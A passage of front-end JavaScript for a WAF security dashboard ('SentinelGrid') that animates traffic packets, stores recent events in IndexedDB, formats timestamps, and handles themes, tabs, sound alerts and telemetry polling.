          // Leg 2: WAAP -> Quarantine (Destroyed)
          {
            p0: { x: nodes.waap.x + nodes.waap.radius, y: nodes.waap.y + 8 },
            p1: { x: nodes.waap.x + (nodes.quarantine.x - nodes.waap.x) * 0.45, y: nodes.waap.y + 16 },
            p2: { x: nodes.quarantine.x - (nodes.quarantine.x - nodes.waap.x) * 0.45, y: nodes.quarantine.y },
            p3: { x: nodes.quarantine.x - nodes.quarantine.radius, y: nodes.quarantine.y },
            color: isDark ? "rgba(239, 68, 68, 0.32)" : "rgba(220, 38, 38, 0.32)"
          }
        ];

        paths.forEach((p, idx) => {
          ctx.beginPath();
          ctx.moveTo(p.p0.x, p.p0.y);
          ctx.bezierCurveTo(p.p1.x, p.p1.y, p.p2.x, p.p2.y, p.p3.x, p.p3.y);
          ctx.strokeStyle = p.color;
          ctx.lineWidth = 3.5;
          ctx.setLineDash(idx === 2 ? [6, 4] : []);
          ctx.stroke();
          ctx.setLineDash([]);
        });

        // ---------------------------------------------------------------------
        // Render & Animate Live Packets
        // ---------------------------------------------------------------------
        if (isParticleStreamActive) {
          for (let i = particles.length - 1; i >= 0; i--) {
            const p = particles[i];
            p.t += p.speed;

            if (p.t < 0) continue;

            const path = paths[p.leg];
            if (!path) {
              particles.splice(i, 1);
              continue;
            }

            const pos = evalCubicBezier(path.p0, path.p1, path.p2, path.p3, Math.min(1, p.t));
            p.trail.push({ x: pos.x, y: pos.y });
            if (p.trail.length > 7) p.trail.shift();

            // Transition between nodes
            if (p.t >= 1.0) {
              if (p.leg === 0) {
                // Packet reached SentinelGrid WAAP Decision Gate!
                p.leg = p.isThreat ? 2 : 1;
                p.t = 0;
                p.trail = [];

                // Trigger WAAP Node Pulse
                nodes.waap.pulseRadius = 1;
                nodes.waap.pulseColor = p.isThreat ? "#EF4444" : "#22C55E";

                // Floating decision badge
                floatingBadges.push({
                  x: nodes.waap.x,
                  y: nodes.waap.y - 42,
                  text: p.isThreat ? "[403 DROP]" : "[200 OK]",
                  color: p.isThreat ? "#EF4444" : "#22C55E",
                  life: 1.0,
                  vy: -0.6
                });
              } else {
                // Packet reached final destination (Origin or Quarantine)
                if (p.leg === 2) {
                  // CRISP QUARANTINE SINKHOLE RETICLE DROP
                  nodes.quarantine.pulseRadius = 1;
                  nodes.quarantine.pulseColor = "#F85149";
                  floatingBadges.push({
                    x: nodes.quarantine.x,
                    y: nodes.quarantine.y - 28,
                    text: "[SINKHOLE]",
                    color: "#EF4444",
                    life: 1.0,
                    vy: -0.7
                  });
                  nodes.quarantine.pulseRadius = 1;
                } else {
                  // PASSED SAFELY TO ORIGIN!
                  nodes.origin.pulseRadius = 1;
                  floatingBadges.push({
                    x: nodes.origin.x,
                    y: nodes.origin.y - 28,
                    text: "[200 OK]",
                    color: "#22C55E",
                    life: 1.0,
                    vy: -0.7
                  });
                }
                particles.splice(i, 1);
                continue;
              }
            }

            // Draw Packet Trail
            if (p.trail.length > 1) {
              ctx.beginPath();
              ctx.moveTo(p.trail[0].x, p.trail[0].y);
              for (let tr = 1; tr < p.trail.length; tr++) {
                ctx.lineTo(p.trail[tr].x, p.trail[tr].y);
              }
              ctx.strokeStyle = p.isThreat ? "rgba(239, 68, 68, 0.45)" : (p.leg === 1 ? "rgba(34, 197, 94, 0.45)" : "rgba(56, 189, 248, 0.45)");
              ctx.lineWidth = p.size * 0.8;
              ctx.stroke();
            }

            // Draw Packet Sphere
            ctx.beginPath();
            ctx.arc(pos.x, pos.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = p.isThreat ? "#EF4444" : (p.leg === 1 ? "#22C55E" : "#38BDF8");
            ctx.shadowColor = ctx.fillStyle;
            ctx.shadowBlur = 10;
            ctx.fill();
            ctx.shadowBlur = 0;

            // Draw Floating Packet Micro-Label
            if (p.label && p.t < 0.85) {
              ctx.font = "9px 'Space Mono', monospace";
              ctx.fillStyle = isDark ? "#CBD5E1" : "#475569";
              ctx.fillText(p.label, pos.x - 20, pos.y - 9);
            }
          }

          // -------------------------------------------------------------------
          // Explosion Sparks Animation (Quarantine Blast)
          // -------------------------------------------------------------------
          for (let s = explosionSparks.length - 1; s >= 0; s--) {
            const sp = explosionSparks[s];
            sp.x += sp.vx;
            sp.y += sp.vy;
            sp.life -= 0.035;
            if (sp.life <= 0) {
              explosionSparks.splice(s, 1);
              continue;
            }
            ctx.beginPath();
            ctx.arc(sp.x, sp.y, 2.4 * sp.life, 0, Math.PI * 2);
            ctx.fillStyle = sp.color || "#EF4444";
            ctx.globalAlpha = Math.max(0, sp.life);
            ctx.shadowColor = ctx.fillStyle;
            ctx.shadowBlur = 8;
            ctx.fill();
            ctx.shadowBlur = 0;
            ctx.globalAlpha = 1.0;
          }

          // -------------------------------------------------------------------
          // Floating Decision Badges
          // -------------------------------------------------------------------
          for (let b = floatingBadges.length - 1; b >= 0; b--) {
            const badge = floatingBadges[b];
            badge.y += badge.vy;
            badge.life -= 0.022;
            if (badge.life <= 0) {
              floatingBadges.splice(b, 1);
              continue;
            }
            ctx.font = "bold 10px 'Plus Jakarta Sans', sans-serif";
            ctx.fillStyle = badge.color;
            ctx.globalAlpha = Math.max(0, badge.life);
            ctx.fillText(badge.text, badge.x - 24, badge.y);
            ctx.globalAlpha = 1.0;
          }
        }

        // ---------------------------------------------------------------------
        // Render 4 Topology Nodes (With Pulse Ripple Waves)
        // ---------------------------------------------------------------------
        for (const key of Object.keys(nodes)) {
          const node = nodes[key];

          // Expanding Ripple Wave
          if (node.pulseRadius > 0) {
            node.pulseRadius += 1.4;
            ctx.beginPath();
            ctx.arc(node.x, node.y, node.radius + node.pulseRadius, 0, Math.PI * 2);
            ctx.strokeStyle = node.pulseColor || node.color;
            ctx.lineWidth = 2;
            ctx.globalAlpha = Math.max(0, 1.0 - node.pulseRadius / 36);
            ctx.stroke();
            ctx.globalAlpha = 1.0;
            if (node.pulseRadius > 36) node.pulseRadius = 0;
          }

          // Node Outer Glow
          ctx.beginPath();
          ctx.arc(node.x, node.y, node.radius + 6, 0, Math.PI * 2);
          ctx.fillStyle = node.glow;
          ctx.fill();

          // Node Inner Body
          const grad = ctx.createRadialGradient(node.x, node.y, 2, node.x, node.y, node.radius);
          grad.addColorStop(0, isDark ? "#1E293B" : "#FFFFFF");
          grad.addColorStop(0.35, node.color);
          grad.addColorStop(1, isDark ? "#111827" : "#334155");

          ctx.beginPath();
          ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
          ctx.fillStyle = grad;
          ctx.strokeStyle = node.color;
          ctx.lineWidth = 2.5;
          ctx.fill();
          ctx.stroke();

          // Inner Core Icon
          ctx.fillStyle = "#FFFFFF";
          ctx.font = node.id === "waap" ? "bold 13px system-ui" : "bold 10px system-ui";
          ctx.textAlign = "center";
          ctx.textBaseline = "middle";
          const code = node.id === "ingress" ? "ING" : (node.id === "waap" ? "WAF" : (node.id === "origin" ? "200" : "403"));
          ctx.font = "bold 10px 'Space Mono', monospace";
          ctx.fillText(code, node.x, node.y);

          // Labels
          ctx.font = "bold 11px system-ui, -apple-system, sans-serif";
          ctx.fillStyle = isDark ? "#F8FAFC" : "#1E293B";
          ctx.fillText(node.label, node.x, node.y + node.radius + 14);

          ctx.font = "9px var(--font-mono, monospace)";
          ctx.fillStyle = node.color;
          ctx.fillText(node.badge, node.x, node.y + node.radius + 26);
        }

        particleAnimationId = requestAnimationFrame(render);
      }

      particleAnimationId = requestAnimationFrame(render);
    }

    function escapeHtml(str) {
      if (!str) return "";
      return String(str).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
      }[c]));
    }

    // -------------------------------------------------------------------------
    // 12-Hour Telemetry & Persistent Threat Ledger In-Browser Container
    // -------------------------------------------------------------------------
    const SentinelEventStore = {
      dbName: "SentinelGridDB",
      storeName: "events_24h",
      db: null,

      async init() {
        return new Promise((resolve) => {
          if (!window.indexedDB) return resolve(null);
          try {
            const req = indexedDB.open(this.dbName, 1);
            req.onupgradeneeded = (e) => {
              const db = e.target.result;
              if (!db.objectStoreNames.contains(this.storeName)) {
                const store = db.createObjectStore(this.storeName, { keyPath: "id" });
                store.createIndex("timestamp", "timestamp", { unique: false });
                store.createIndex("action", "action", { unique: false });
              }
            };
            req.onsuccess = (e) => {
              this.db = e.target.result;
              this.pruneExpired();
              // Periodic background prune every 15 minutes
              setInterval(() => this.pruneExpired(), 15 * 60 * 1000);
              resolve(this.db);
            };
            req.onerror = () => resolve(null);
          } catch (_) {
            resolve(null);
          }
        });
      },

      sanitizeEvent(ev) {
        if (!ev || !ev.id) return null;
        return {
          id: String(ev.id),
          website_id: ev.website_id || "",
          client_ip: ev.client_ip || "127.0.0.1",
          method: ev.method || "GET",
          path: ev.path || "/",
          timestamp: ev.timestamp || new Date().toISOString(),
          action: ev.action || "ALLOW",
          status_code: ev.status_code || 200,
          risk_score: Number(ev.risk_score) || 0,
          rule_triggered: ev.rule_triggered || "",
          details: ev.details ? String(ev.details).substring(0, 500) : "",
          headers: ev.headers ? String(ev.headers).substring(0, 1000) : "",
          payload_sample: ev.payload_sample ? String(ev.payload_sample).substring(0, 1000) : ""
        };
      },

      async putBatch(events) {
        if (!events || !events.length) return;
        const sanitized = events.map(e => this.sanitizeEvent(e)).filter(Boolean);
        if (!this.db) {
          try {
            const cur = JSON.parse(localStorage.getItem("sg_stored_events_24h") || "[]");
            const map = new Map();
            cur.forEach(e => map.set(e.id, e));
            sanitized.forEach(e => { if (e && e.id) map.set(e.id, e); });
            const merged = Array.from(map.values()).sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
            localStorage.setItem("sg_stored_events_24h", JSON.stringify(merged.slice(0, 1000)));
          } catch (_) {}
          return;
        }
        return new Promise((resolve) => {
          try {
            const tx = this.db.transaction(this.storeName, "readwrite");
            const store = tx.objectStore(this.storeName);
            sanitized.forEach(ev => {
              if (ev && ev.id) store.put(ev);
            });
            tx.oncomplete = () => resolve();
            tx.onerror = () => resolve();
          } catch (_) {
            resolve();
          }
        });
      },

      async getAll() {
        if (!this.db) {
          try {
            const raw = localStorage.getItem("sg_stored_events_24h");
            return raw ? JSON.parse(raw) : [];
          } catch (_) { return []; }
        }
        return new Promise((resolve) => {
          try {
            const tx = this.db.transaction(this.storeName, "readonly");
            const store = tx.objectStore(this.storeName);
            const req = store.getAll();
            req.onsuccess = () => {
              const sorted = (req.result || []).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
              resolve(sorted);
            };
            req.onerror = () => resolve([]);
          } catch (_) {
            resolve([]);
          }
        });
      },

      async pruneExpired() {
        if (!this.db) return;
        try {
          // 12-Hour threshold: clear live stream non-threat traffic older than 12 hours
          const cutoff12h = new Date(Date.now() - 12 * 3600 * 1000).toISOString();
          const tx = this.db.transaction(this.storeName, "readwrite");
          const store = tx.objectStore(this.storeName);
          const index = store.index("timestamp");
          const range = IDBKeyRange.upperBound(cutoff12h);
          const req = index.openCursor(range);
          req.onsuccess = (e) => {
            const cursor = e.target.result;
            if (cursor) {
              const val = cursor.value;
              // Preserve blocked IPs, challenges, high-risk attacks, and quarantine events permanently in the threat ledger
              const isCriticalThreat = val.action === "BLOCK" || 
                                       val.action === "CHALLENGE" || 
                                       (val.risk_score && val.risk_score >= 50) || 
                                       val.rule_triggered === "ALREADY-BLOCKED-REACH-ATTEMPT" || 
                                       val.rule_triggered === "IP-BLOCK-LIST";
              if (!isCriticalThreat) {
                // Delete routine benign requests older than 12 hours to prevent container bloat
                cursor.delete();
              }
              cursor.continue();
            }
          };
        } catch (_) {}
      },

      async clear() {
        if (!this.db) {
          try { localStorage.removeItem("sg_stored_events_24h"); } catch (_) {}
          return;
        }
        return new Promise((resolve) => {
          try {
            const tx = this.db.transaction(this.storeName, "readwrite");
            const store = tx.objectStore(this.storeName);
            store.clear();
            tx.oncomplete = () => {
              try { localStorage.removeItem("sg_stored_events_24h"); } catch (_) {}
              resolve();
            };
            tx.onerror = () => resolve();
          } catch (_) {
            resolve();
          }
        });
      }
    };

    function updateContainerBadge(count) {
      const b = document.getElementById("container-24h-badge");
      if (b) b.innerText = `THREAT CONTAINER: ${Number(count || 0).toLocaleString()} EVENTS`;
    }

    async function sync24hHistory() {
      const btn = document.getElementById("sync-24h-btn");
      if (btn) btn.innerHTML = "⏳ Syncing 24h...";
      try {
        const res = await fetch(`${API}/events/history-24h`);
        if (res.ok) {
          const data = await res.json();
          if (data.events && data.events.length) {
            await SentinelEventStore.putBatch(data.events);
            allRecentEvents = await SentinelEventStore.getAll();
            liveTrafficBuffer = [...allRecentEvents];
            applyEventFilter();
            renderLiveTrafficTable();
            updateContainerBadge(allRecentEvents.length);
            showThreatToast("24H Ledger Synchronized", `Stored ${data.events.length} events in local container.`);
          }
        }
      } catch (err) {
        console.error("24h history sync error:", err);
      } finally {
        if (btn) btn.innerHTML = "💾 Sync 24H History";
      }
    }

    async function bootstrapEventStore() {
      try {
        await SentinelEventStore.init();
        const stored = await SentinelEventStore.getAll();
        if (stored && stored.length > 0) {
          allRecentEvents = stored;
          liveTrafficBuffer = [...stored];
          updateContainerBadge(allRecentEvents.length);
          applyEventFilter();
          renderLiveTrafficTable();
        }
      } catch (err) {
        console.warn("Bootstrap event store warning:", err);
      }
    }

    let allRecentEvents = [];
    let allWebsites = [];
    let currentDomainScope = "ALL";
    let autoRefreshRate = 2; // seconds (default 2s)
    let autoRefreshTimer = null;
    let countdownTimer = null;
    let secondsToNextSync = 2;
    let knownEventIds = new Set();
    let activeDrawerEvent = null;
    let isStreamPaused = false;
    
    // Timezone preference: "LOCAL" or "UTC"
    let consoleTimezone = localStorage.getItem("sg_tz_pref") || "LOCAL";

    // Synthesizer Web Audio API alerts toggle
    let soundAlertsEnabled = localStorage.getItem("sg_sound_alerts") === "true";
    let audioCtx = null;

    // -------------------------------------------------------------------------
    // High-Precision Timestamp Formatter & Relative Time Engine
    // -------------------------------------------------------------------------
    function formatTimestamp(rawTimestamp) {
      if (!rawTimestamp) return { time: "Live", relative: "just now", full: "Live Telemetry" };

      let date;
      if (typeof rawTimestamp === "number") {
        date = new Date(rawTimestamp > 1e11 ? rawTimestamp : rawTimestamp * 1000);
      } else {
        date = new Date(rawTimestamp);
      }

      if (isNaN(date.getTime())) {
        return { time: String(rawTimestamp), relative: "", full: String(rawTimestamp) };
      }

      const now = Date.now();
      const diffMs = now - date.getTime();
      const diffSec = Math.floor(diffMs / 1000);

      let relative = "just now";
      if (diffSec >= 60 && diffSec < 3600) {
        relative = `${Math.floor(diffSec / 60)}m ago`;
      } else if (diffSec >= 3600 && diffSec < 86400) {
        relative = `${Math.floor(diffSec / 3600)}h ago`;
      } else if (diffSec >= 86400) {
        relative = `${Math.floor(diffSec / 86400)}d ago`;
      } else if (diffSec > 0) {
        relative = `${diffSec}s ago`;
      }

      const pad = (n, len = 2) => String(n).padStart(len, "0");
      const ms = pad(date.getMilliseconds(), 3);

      let timeFormatted = "";
      if (consoleTimezone === "UTC") {
        timeFormatted = `${pad(date.getUTCHours())}:${pad(date.getUTCMinutes())}:${pad(date.getUTCSeconds())}.${ms} UTC`;
      } else {
        // Local Browser Time with 12-hour format and milliseconds
        let hours = date.getHours();
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12;
        hours = hours ? hours : 12; // 0 becomes 12
        timeFormatted = `${pad(hours)}:${pad(date.getMinutes())}:${pad(date.getSeconds())}.${ms} ${ampm}`;
      }

      const localDateStr = date.toLocaleDateString();
      const fullISO = date.toISOString();

      return {
        time: timeFormatted,
        relative: relative,
        full: `Local: ${localDateStr} ${timeFormatted} | UTC: ${fullISO}`
      };
    }

    // -------------------------------------------------------------------------
    // Real-Time System Clock (Updates Every 1,000ms)
    // -------------------------------------------------------------------------
    function updateSystemClock() {
      const now = new Date();
      const dateEl = document.getElementById("clock-date-str");
      const timeEl = document.getElementById("clock-time-str");
      const tzBadge = document.getElementById("clock-tz-badge");

      if (!timeEl) return;

      const pad = (n, len = 2) => String(n).padStart(len, "0");

      if (consoleTimezone === "UTC") {
        const days = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
        const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
        const dayName = days[now.getUTCDay()];
        const monthName = months[now.getUTCMonth()];
        const dayNum = pad(now.getUTCDate());
        const year = now.getUTCFullYear();
        if (dateEl) dateEl.innerText = `${dayName}, ${dayNum} ${monthName} ${year}`;
        timeEl.innerText = `${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())}`;
        if (tzBadge) tzBadge.innerText = "UTC (GMT+0)";
      } else {
        const options = { weekday: 'short', year: 'numeric', month: 'short', day: '2-digit' };
        if (dateEl) dateEl.innerText = now.toLocaleDateString(undefined, options);
        let hours = now.getHours();
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12 || 12;
        timeEl.innerText = `${pad(hours)}:${pad(now.getMinutes())}:${pad(now.getSeconds())} ${ampm}`;
        if (tzBadge) tzBadge.innerText = "IST (UTC+05:30)";
      }
    }
    setInterval(updateSystemClock, 1000);

    // Auto-update all relative timestamps across the DOM every 4 seconds
    function updateAllRelativeTimestamps() {
      document.querySelectorAll("[data-raw-ts]").forEach(el => {
        const raw = el.getAttribute("data-raw-ts");
        if (raw) {
          const t = formatTimestamp(raw);
          el.innerText = `(${t.relative})`;
        }
      });
    }
    setInterval(updateAllRelativeTimestamps, 4000);

    // Live Threat Notification Dropdown Popover
    let blockedNotifications = [];
    function recordBlockedNotification(ev) {
      if (!ev) return;
      blockedNotifications.unshift(ev);
      if (blockedNotifications.length > 25) blockedNotifications.pop();
      updateNotificationUI();
    }
    function updateNotificationUI() {
      const badge = document.getElementById("notificationBadge");
      const list = document.getElementById("notificationList");
      if (badge) {
        if (blockedNotifications.length > 0) {
          badge.style.display = "block";
          badge.innerText = blockedNotifications.length;
        } else {
          badge.style.display = "none";
        }
      }
      if (list && blockedNotifications.length > 0) {
        list.innerHTML = blockedNotifications.slice(0, 8).map(n => `
          <div style="background: var(--sand-warm); padding: 8px 10px; border-radius: var(--radius-sm); border-left: 3px solid var(--terracotta); font-size: 11px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px;">
              <span style="font-weight: 700; color: var(--terracotta); font-family: var(--font-mono); font-size: 10px;">${escapeHtml(n.rule_triggered || 'THREAT-BLOCK')}</span>
              <span style="color: var(--text-muted); font-size: 10px;">${escapeHtml(formatTimestamp(n.timestamp).relative)}</span>
            </div>
            <div style="color: var(--text-charcoal); font-family: var(--font-mono); font-size: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
              ${escapeHtml(n.method)} ${escapeHtml(n.path)}
            </div>
            <div style="color: var(--text-muted); font-size: 9px; margin-top: 2px;">Client IP: ${escapeHtml(n.client_ip)}</div>
          </div>
        `).join("");
      }
    }
    function toggleNotificationPopover() {
      const popover = document.getElementById("notificationPopover");
      if (popover) {
        popover.style.display = (popover.style.display === "none" || popover.style.display === "") ? "block" : "none";
      }
    }
    function clearNotifications() {
      blockedNotifications = [];
      updateNotificationUI();
      const list = document.getElementById("notificationList");
      if (list) list.innerHTML = `<div style="color: var(--text-muted); font-size: 11px; text-align: center; padding: 12px;">No active blocked events</div>`;
    }

    // Keyboard Shortcuts Modal Controller
    function openShortcutsModal() {
      const modal = document.getElementById("shortcuts-modal");
      const backdrop = document.getElementById("shortcuts-modal-backdrop");
      if (modal && backdrop) {
        modal.style.display = "block";
        backdrop.classList.add("active");
      }
    }
    function closeShortcutsModal() {
      const modal = document.getElementById("shortcuts-modal");
      const backdrop = document.getElementById("shortcuts-modal-backdrop");
      if (modal && backdrop) {
        modal.style.display = "none";
        backdrop.classList.remove("active");
      }
    }

    function toggleTimezonePreference() {
      consoleTimezone = consoleTimezone === "LOCAL" ? "UTC" : "LOCAL";
      localStorage.setItem("sg_tz_pref", consoleTimezone);
      const btn = document.getElementById("tz-toggle-btn");
      const label = document.getElementById("tz-btn-label");
      if (label) {
        label.innerText = consoleTimezone === "LOCAL" ? "TZ: IST" : "TZ: UTC";
      } else if (btn) {
        btn.innerText = consoleTimezone === "LOCAL" ? "🌐 TZ: LOCAL (IST)" : "🌐 TZ: UTC (GMT+0)";
      }
      updateSystemClock();
      updateAllRelativeTimestamps();
      applyEventFilter();
      loadEndpoints();
      loadConnectors();
    }

    function toggleSoundAlerts() {
      soundAlertsEnabled = !soundAlertsEnabled;
      localStorage.setItem("sg_sound_alerts", soundAlertsEnabled);
      const btn = document.getElementById("sound-toggle-btn");
      const icon = document.getElementById("sound-btn-icon");
      const label = document.getElementById("sound-btn-label");
      const iconHtml = soundAlertsEnabled
        ? `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>`
        : `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>`;
      if (icon && label) {
        icon.innerHTML = iconHtml;
        label.innerText = soundAlertsEnabled ? "Sound: ON" : "Sound: OFF";
      } else if (btn) {
        btn.innerHTML = `${iconHtml}<span class="btn-text-label" style="margin-left: 4px;">Sound: ${soundAlertsEnabled ? 'ON' : 'OFF'}</span>`;
      }
      if (soundAlertsEnabled) playThreatTone(90);
    }

    function playThreatTone(riskScore) {
      if (!soundAlertsEnabled) return;
      try {
        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        if (audioCtx.state === 'suspended') audioCtx.resume();

        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);

        if (riskScore >= 95) {
          osc.type = "sawtooth";
          osc.frequency.setValueAtTime(880, audioCtx.currentTime);
          osc.frequency.exponentialRampToValueAtTime(440, audioCtx.currentTime + 0.16);
          gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.16);
          osc.start();
          osc.stop(audioCtx.currentTime + 0.16);
        } else {
          osc.type = "sine";
          osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
          gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.12);
          osc.start();
          osc.stop(audioCtx.currentTime + 0.12);
        }
      } catch (e) {
        console.warn("Audio chime error:", e);
      }
    }

    // Dynamic 1-second relative time ticker
    setInterval(() => {
      if (isStreamPaused) return;
      document.querySelectorAll("[data-raw-ts]").forEach(el => {
        const raw = el.getAttribute("data-raw-ts");
        const t = formatTimestamp(raw);
        el.innerText = `(${t.relative})`;
      });
    }, 1000);

    // -------------------------------------------------------------------------
    // Theme Management (Dark Obsidian Default & Light Canvas Option)
    // -------------------------------------------------------------------------
    let currentTheme = localStorage.getItem("sg_theme") || "dark";
    function applyTheme() {
      const btn = document.getElementById("theme-toggle-btn");
      const icon = document.getElementById("theme-btn-icon");
      const label = document.getElementById("theme-btn-label");
      if (currentTheme === "light") {
        document.documentElement.setAttribute("data-theme", "light");
        const sunSvg = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>`;
        if (icon) icon.innerHTML = sunSvg;
        if (label) label.innerText = "Theme: DARK CREAM";
        if (!icon && btn) btn.innerHTML = `${sunSvg}<span class="btn-text-label" style="margin-left: 4px;">Theme: DARK CREAM</span>`;
      } else {
        document.documentElement.removeAttribute("data-theme");
        const moonSvg = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>`;
        if (icon) icon.innerHTML = moonSvg;
        if (label) label.innerText = "Theme: OBSIDIAN";
        if (!icon && btn) btn.innerHTML = `${moonSvg}<span class="btn-text-label" style="margin-left: 4px;">Theme: OBSIDIAN</span>`;
      }
    }
    function toggleThemePreference() {
      currentTheme = currentTheme === "dark" ? "light" : "dark";
      localStorage.setItem("sg_theme", currentTheme);
      applyTheme();
    }

    // -------------------------------------------------------------------------
    // Tab Navigation Controller (with URL Hash & LocalStorage Sync)
    // -------------------------------------------------------------------------
    function switchTab(tabId, updateUrl = true) {
      // Auto-dismiss off-canvas sidebar on mobile navigation
      if (window.innerWidth <= 900) {
        const sidebar = document.getElementById("appSidebar");
        const backdrop = document.getElementById("sidebarBackdrop");
        if (sidebar) sidebar.classList.remove("mobile-open");
        if (backdrop) backdrop.classList.remove("active");
      }

      document.querySelectorAll(".view-section").forEach(el => el.classList.remove("active"));
      document.querySelectorAll(".nav-item").forEach(el => el.classList.remove("active"));

      const target = document.getElementById("view-" + tabId);
      if (target) target.classList.add("active");

      const navItems = Array.from(document.querySelectorAll(".nav-item"));
      const match = navItems.find(el => el.getAttribute("onclick")?.includes(`'${tabId}'`));
      if (match) match.classList.add("active");

      const viewTitles = {
        dashboard: "Live SOC Telemetry",
        livetraffic: "Live Traffic Stream & SSE Telemetry",
        domains: "Domain & Site Mesh",
        inventory: "Discovered API Routes",
        iprules: "IP Access Control",
        connectors: "Edge Nodes & Connectors",
        sandbox: "In-Line WAF Lab",
        simulation: "Policy Simulation",
        onboarding: "Architecture & Setup Guide"
      };
      const topbarTitle = document.getElementById("topbar-current-view");
      if (topbarTitle && viewTitles[tabId]) {
        topbarTitle.innerText = viewTitles[tabId];
      }

      if (updateUrl) {
        history.replaceState(null, null, "#" + tabId);
        localStorage.setItem("sg_active_tab", tabId);
      }

      if (tabId === "dashboard") pollTelemetry(true);
      if (tabId === "livetraffic") {
        renderLiveTrafficTable();
        initLiveTrafficSSE();
      }
      if (tabId === "domains") loadDomains();
      if (tabId === "inventory") loadEndpoints();
      if (tabId === "iprules") loadIpRules();
      if (tabId === "connectors") loadConnectors();
    }

    // -------------------------------------------------------------------------
    // Real-Time Poller & Live Stream Engine
    // -------------------------------------------------------------------------
    function changeAutoRefreshRate() {
      const select = document.getElementById("auto-refresh-rate");
      autoRefreshRate = parseInt(select.value, 10);
      setupAutoRefreshEngine();
    }

    function toggleStreamPause() {
      isStreamPaused = !isStreamPaused;
      const btn = document.getElementById("stream-pause-btn");
      const pulse = document.getElementById("live-pulse-indicator");
      const text = document.getElementById("live-indicator-text");

      if (isStreamPaused) {
        btn.innerText = "▶️ Resume";
        pulse.classList.add("paused");
        text.innerText = "STREAM PAUSED";
        text.style.color = "var(--warm-ochre)";
      } else {
        btn.innerText = "⏸️ Pause";
        pulse.classList.remove("paused");
        text.innerText = `LIVE STREAMING (${autoRefreshRate}s)`;
        text.style.color = "var(--sage-green)";
        pollTelemetry(true);
      }
    }

    // Keyboard shortcut: Spacebar toggles pause/resume when not focused on an input
    window.addEventListener("keydown", (e) => {
      if (e.code === "Space" && e.target.tagName !== "INPUT" && e.target.tagName !== "TEXTAREA") {
        e.preventDefault();
        toggleStreamPause();
      }
    });

    function setupAutoRefreshEngine() {
      if (autoRefreshTimer) clearInterval(autoRefreshTimer);
      if (countdownTimer) clearInterval(countdownTimer);

      const pulse = document.getElementById("live-pulse-indicator");
      const indicatorText = document.getElementById("live-indicator-text");
      const countdownBadge = document.getElementById("sync-countdown-badge");

      if (autoRefreshRate === 0) {
        pulse.classList.add("paused");
        indicatorText.innerText = "STREAM PAUSED";
        indicatorText.style.color = "var(--warm-ochre)";
        countdownBadge.innerText = "Manual Only";
        return;
      }

      pulse.classList.remove("paused");
      indicatorText.innerText = `LIVE STREAMING (${autoRefreshRate}s)`;
      indicatorText.style.color = "var(--sage-green)";
      secondsToNextSync = autoRefreshRate;
      countdownBadge.innerText = `Next: ${secondsToNextSync}s`;

      countdownTimer = setInterval(() => {
        if (isStreamPaused) return;
        secondsToNextSync--;
        if (secondsToNextSync <= 0) {
          secondsToNextSync = autoRefreshRate;
        }
        countdownBadge.innerText = `Next: ${secondsToNextSync}s`;
      }, 1000);

      autoRefreshTimer = setInterval(() => {
        if (!isStreamPaused) pollTelemetry(false);
      }, autoRefreshRate * 1000);

      // Ambient live traffic pulse engine (keeps 3D visualizer continuously dynamic)
      setInterval(() => {
        if (!isStreamPaused && typeof dispatchLivePacketToPipeline === "function") {
          const nowMs = Date.now();
          if (nowMs - lastDispatchedPacketTime > 3500) {
            const ambientPaths = ["/api/v1/auth/session", "/dashboard", "/api/v1/courses", "/profile", "/status"];
            const p = ambientPaths[Math.floor(Math.random() * ambientPaths.length)];
            dispatchLivePacketToPipeline({
              method: "GET",
              path: p,
              action: "ALLOW",
              risk_score: 0.0,
              client_ip: "152.59.32." + Math.floor(Math.random() * 200 + 10)
            });
          }
        }
      }, 3000);
    }

    async function pollTelemetry(isManual = false) {
      try {
        const url = currentDomainScope === "ALL" 
          ? `${API}/overview` 
          : `${API}/overview?website_id=${encodeURIComponent(currentDomainScope)}`;

        const controller = new AbortController();
